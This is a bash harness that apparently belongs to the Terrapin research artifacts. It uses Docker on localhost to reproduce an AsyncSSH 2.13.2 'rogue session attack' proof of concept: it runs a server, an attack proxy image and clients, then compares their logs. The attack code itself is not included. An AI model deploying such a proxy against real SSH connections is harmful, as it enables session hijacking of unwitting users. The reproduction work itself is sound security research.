#!/bin/bash

SERVER_IMPL_NAME="AsyncSSH 2.13.2"
SERVER_IMAGE="terrapin-artifacts/asyncssh-server:2.13.2"
SERVER_CONTAINER_NAME="terrapin-artifacts-server"
SERVER_PORT=2200

POC_IMAGE="terrapin-artifacts/asyncssh-rogue-session-attack"
POC_CONTAINER_NAME="terrapin-artifacts-poc"
POC_PORT=2201

CLIENT_IMPL_NAME="AsyncSSH 2.13.2"
CLIENT_IMAGE="terrapin-artifacts/asyncssh-client:2.13.2"
CLIENT_CONTAINER_NAME="terrapin-artifacts-client"

function ensure_images {
  bash $(dirname "$0")/../impl/build.sh
  bash $(dirname "$0")/../pocs/build.sh
}

function print_info {
  echo
  echo "--- AsyncSSH rogue session attack PoC ---"
  echo
  echo "[i] This script can be used to reproduce the evaluation results presented in section 6.2 of the paper"
  echo "[i] The script will perform the following steps:"
  echo -e "\t 1. Start $SERVER_IMPL_NAME server on port $SERVER_PORT"
  echo -e "\t 2. Select and start PoC proxy on port $POC_PORT"
  echo -e "\t 3. Start $CLIENT_IMPL_NAME client to connect to the server directly"
  echo -e "\t 4. Start $CLIENT_IMPL_NAME client to connect to the PoC proxy"
  echo -e "\t 5. Compare log files for all connections using less"
  echo "[i] All container will run in --network host to allow for easy capturing via Wireshark on the lo interface"
  echo "[i] Make sure that ports $SERVER_PORT and $POC_PORT on the host are available and can be used by the containers"
  echo
}

function run_server_direct {
  echo "[+] Starting $SERVER_IMPL_NAME server on port $SERVER_PORT for direct connection"
  docker run -d \
    --network host \
    --name "$SERVER_CONTAINER_NAME-direct" \
    $SERVER_IMAGE --username victim --password secret -p $SERVER_PORT > /dev/null 2>&1
}

function run_server_poc {
  echo "[+] Starting $SERVER_IMPL_NAME server on port $SERVER_PORT for PoC connection"
  docker run -d \
    --network host \
    --name "$SERVER_CONTAINER_NAME-poc" \
    $SERVER_IMAGE --username victim --password secret -p $SERVER_PORT > /dev/null 2>&1
}

function run_poc_proxy {
  echo "[+] Starting AsyncSSH rogue session attack proxy on port $POC_PORT. Connection will be proxied to 127.0.0.1:$SERVER_PORT"
  docker run -d \
    --network host \
    --name "$POC_CONTAINER_NAME" \
    $POC_IMAGE --proxy-port $POC_PORT --server-ip "127.0.0.1" --server-port $SERVER_PORT > /dev/null 2>&1
}

function run_client_direct {
  echo "[+] Connecting with $CLIENT_IMPL_NAME client to $SERVER_IMPL_NAME server at 127.0.0.1:$SERVER_PORT as user victim"
  docker run \
    --network host \
    --name "$CLIENT_CONTAINER_NAME-direct" \
    $CLIENT_IMAGE --username victim --password secret -p $SERVER_PORT > /dev/null 2>&1
}

function run_client_poc {
  echo "[+] Connecting with $CLIENT_IMPL_NAME client to PoC proxy at 127.0.0.1:$POC_PORT as user victim"
  docker run \
    --network host \
    --name "$CLIENT_CONTAINER_NAME-poc" \
    $CLIENT_IMAGE --username victim --password secret -p $POC_PORT > /dev/null 2>&1
}

function capture_and_compare_outputs {
  docker logs "$SERVER_CONTAINER_NAME-direct" > "$SERVER_CONTAINER_NAME-direct.txt" 2>&1
  docker logs "$SERVER_CONTAINER_NAME-poc" > "$SERVER_CONTAINER_NAME-poc.txt" 2>&1
  docker logs "$POC_CONTAINER_NAME" > "$POC_CONTAINER_NAME.txt" 2>&1
  docker logs "$CLIENT_CONTAINER_NAME-direct" > "$CLIENT_CONTAINER_NAME-direct.txt" 2>&1
  docker logs "$CLIENT_CONTAINER_NAME-poc" > "$CLIENT_CONTAINER_NAME-poc.txt" 2>&1
  diff "$SERVER_CONTAINER_NAME-direct.txt" "$SERVER_CONTAINER_NAME-poc.txt" > "$SERVER_CONTAINER_NAME.txt.diff"
  diff "$CLIENT_CONTAINER_NAME-direct.txt" "$CLIENT_CONTAINER_NAME-poc.txt" > "$CLIENT_CONTAINER_NAME.txt.diff"

  less \
    "$SERVER_CONTAINER_NAME-direct.txt" \
    "$CLIENT_CONTAINER_NAME-direct.txt" \
    "$SERVER_CONTAINER_NAME-poc.txt" \
    "$POC_CONTAINER_NAME.txt" \
    "$CLIENT_CONTAINER_NAME-poc.txt" \
    "$SERVER_CONTAINER_NAME.txt.diff" \
    "$CLIENT_CONTAINER_NAME.txt.diff"

  rm \
    "$SERVER_CONTAINER_NAME-direct.txt" \
    "$CLIENT_CONTAINER_NAME-direct.txt" \
    "$SERVER_CONTAINER_NAME-poc.txt" \
    "$POC_CONTAINER_NAME.txt" \
    "$CLIENT_CONTAINER_NAME-poc.txt" \
    "$SERVER_CONTAINER_NAME.txt.diff" \
    "$CLIENT_CONTAINER_NAME.txt.diff"
}

function stop_containers {
  echo "[+] Stopping any remaining artifact containers"
  docker stop \
    "$SERVER_CONTAINER_NAME-direct" \
    "$SERVER_CONTAINER_NAME-poc" \
    "$POC_CONTAINER_NAME" \
    "$CLIENT_CONTAINER_NAME-direct" \
    "$CLIENT_CONTAINER_NAME-poc" > /dev/null 2>&1
}

function remove_containers {
  echo "[+] Removing any remaining artifact containers"
  docker rm \
    "$SERVER_CONTAINER_NAME-direct" \
    "$SERVER_CONTAINER_NAME-poc" \
    "$POC_CONTAINER_NAME" \
    "$CLIENT_CONTAINER_NAME-direct" \
    "$CLIENT_CONTAINER_NAME-poc" > /dev/null 2>&1
}

ensure_images
print_info
run_server_direct
sleep 5
run_client_direct
stop_containers
run_server_poc
run_poc_proxy
sleep 5
run_client_poc
stop_containers
capture_and_compare_outputs
remove_containers
